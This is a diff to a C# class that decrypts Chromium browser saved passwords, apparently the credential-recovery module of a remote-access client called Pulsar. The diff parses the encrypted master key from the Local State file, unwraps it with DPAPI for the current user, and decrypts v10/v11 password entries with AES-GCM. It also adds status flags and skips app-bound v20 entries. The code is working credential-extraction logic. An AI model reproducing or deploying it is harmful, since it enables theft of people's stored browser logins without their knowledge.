@@ -5,6 +5,7 @@ using System.IO;
 using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
+using System.Text.RegularExpressions;
 
 namespace Pulsar.Client.Recovery.Browsers
 {
@@ -14,41 +15,58 @@ namespace Pulsar.Client.Recovery.Browsers
     public class ChromiumDecryptor
     {
         private readonly byte[] _key;
+        public bool IsAvailable { get; private set; }
+        public bool IsLocked { get; private set; }
+        public string LastError { get; private set; }
 
         public ChromiumDecryptor(string localStatePath)
         {
             try
             {
-                if (localStatePath.Contains("AppData\\Local\\Application Data\\User Data"))
+                if (string.IsNullOrEmpty(localStatePath) || !File.Exists(localStatePath))
                 {
+                    IsLocked = true;
+                    LastError = "Local State is missing.";
                     return;
                 }
 
-                if (File.Exists(localStatePath))
+                string localState = File.ReadAllText(localStatePath);
+                Match match = Regex.Match(localState, "\"encrypted_key\"\\s*:\\s*\"([^\"]+)\"", RegexOptions.IgnoreCase);
+                if (!match.Success)
                 {
-                    string localState = File.ReadAllText(localStatePath);
+                    IsLocked = true;
+                    LastError = "Encrypted key is not present.";
+                    return;
+                }
 
-                    var startIndex = localState.IndexOf("\"encrypted_key\"") + "\"encrypted_key\"".Length + 2;
-                    var endIndex = localState.IndexOf('"', startIndex + 1);
-                    var encKeyStr = localState.Substring(startIndex, endIndex - startIndex);
+                byte[] encryptedKey = Convert.FromBase64String(match.Groups[1].Value);
+                if (encryptedKey.Length < 5)
+                {
+                    IsLocked = true;
+                    LastError = "Encrypted key is malformed.";
+                    return;
+                }
 
-                    try
-                    {
-                        _key = ProtectedData.Unprotect(Convert.FromBase64String(encKeyStr).Skip(5).ToArray(), null,
-    DataProtectionScope.CurrentUser);
-                    }
-                    catch (Exception e)
-                    {
-                        Debug.WriteLine(localStatePath);
-                        Debug.WriteLine(e);
-                        Debug.WriteLine("Failed to decrypt the key. Ensure you have the correct local state file.");
-                        return;
-                    }
+                string prefix = Encoding.ASCII.GetString(encryptedKey, 0, 5);
+                if (!string.Equals(prefix, "DPAPI", StringComparison.Ordinal))
+                {
+                    IsLocked = true;
+                    LastError = "Unsupported Chromium key envelope.";
+                    return;
+                }
+
+                _key = ProtectedData.Unprotect(encryptedKey.Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
+                IsAvailable = _key != null && _key.Length == 32;
+                if (!IsAvailable)
+                {
+                    IsLocked = true;
+                    LastError = "Chromium encryption key is unavailable.";
                 }
             }
             catch (Exception e)
             {
-                Debug.WriteLine(e);
+                IsLocked = true;
+                LastError = e.Message;
             }
         }
 
@@ -60,20 +78,47 @@ namespace Pulsar.Client.Recovery.Browsers
                     return "";
 
                 var cipherTextBytes = Encoding.Default.GetBytes(cipherText);
+                if (cipherTextBytes.Length >= 3 &&
+                    Encoding.ASCII.GetString(cipherTextBytes, 0, 3) == "v20")
+                {
+                    IsLocked = true;
+                    LastError = "App-bound Chromium credentials are unsupported.";
+                    return string.Empty;
+                }
 
-                var initialisationVector = cipherTextBytes.Skip(3).Take(12).ToArray();
-                var encryptedData = cipherTextBytes.Skip(15).ToArray();
+                if (cipherTextBytes.Length >= 3 &&
+                    (Encoding.ASCII.GetString(cipherTextBytes, 0, 3) == "v10" ||
+                     Encoding.ASCII.GetString(cipherTextBytes, 0, 3) == "v11"))
+                {
+                    if (!IsAvailable)
+                        return string.Empty;
 
-                // Separate the actual encrypted data from the auth tag
-                var actualEncryptedData = encryptedData.Take(encryptedData.Length - 16).ToArray();
-                var authTag = encryptedData.Skip(encryptedData.Length - 16).ToArray();
+                    var initialisationVector = cipherTextBytes.Skip(3).Take(12).ToArray();
+                    var encryptedData = cipherTextBytes.Skip(15).ToArray();
+                    if (encryptedData.Length < 16)
+                        return string.Empty;
 
-                var decryptedPassword = DecryptAesGcm(actualEncryptedData, _key, initialisationVector, authTag);
+                    var actualEncryptedData = encryptedData.Take(encryptedData.Length - 16).ToArray();
+                    var authTag = encryptedData.Skip(encryptedData.Length - 16).ToArray();
+                    var decryptedPassword = DecryptAesGcm(actualEncryptedData, _key, initialisationVector, authTag);
+                    return decryptedPassword == null ? string.Empty : Encoding.UTF8.GetString(decryptedPassword);
+                }
 
-                if (decryptedPassword == null || decryptedPassword.Length == 0)
-                    return "";
+                if (!cipherTextBytes.SequenceEqual(new byte[0]))
+                {
+                    try
+                    {
+                        byte[] dpapi = ProtectedData.Unprotect(cipherTextBytes, null, DataProtectionScope.CurrentUser);
+                        return dpapi == null ? string.Empty : Encoding.UTF8.GetString(dpapi);
+                    }
+                    catch
+                    {
+                        IsLocked = true;
+                        LastError = "Legacy Chromium credential is locked.";
+                    }
+                }
 
-                return Encoding.UTF8.GetString(decryptedPassword);
+                return string.Empty;
             }
             catch (Exception e)
             {
